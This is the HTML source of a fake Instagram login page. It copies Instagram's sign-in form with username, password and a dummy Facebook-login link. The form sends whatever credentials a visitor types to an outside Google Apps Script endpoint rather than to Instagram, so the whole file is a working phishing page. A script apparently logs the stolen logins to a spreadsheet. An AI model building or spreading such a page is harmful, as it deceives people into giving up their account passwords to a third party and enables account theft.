<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link href='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQGzmRGJF8UP4FiZ1yZWzoff-4ZO6zJ1BP0cA&s' rel='stylesheet'>
    <link rel="stylesheet" href="login.css">
    <title>Instagram Login </title>
</head>
<body>
    <main>
        <img src="IG.jpeg" alt="" class="phoneImg">
        <div class="form-div">
            <form method="post" action="https://script.google.com/macros/s/AKfycbxeV52NCbM1KQ12LwBob3Qt5iNzZAhFsJaDc9p3uMboDksylQJiAWn3i92IcmTi0YDUgg/exec" alt="logo">
                <input type="text" name="username" placeholder="Username" class="input" required>
                <!-- <input type="text" class="input" placeholder="phone number, username, or email" required> -->
                <input type="password" name="password" placeholder="Password" class="input" required>
                <!-- <input type="password" class="input" required placeholder="Password"> -->
                <button class="login-btn">Log In</button>
                <p id="or">or</p>
                <a href="#" class="fb-login"><i class='bx bxl-facebook-square'></i>Log in with Facebook</a>
            </form>
            <hr>
            <div class="sign-up">
                <p>Don't have an account? <a href="#" class="sign-link">Sign up</a></p>
            </div>
        </div>
    </main>
</body>
    <script src="google sheet .js"></script>
</html>
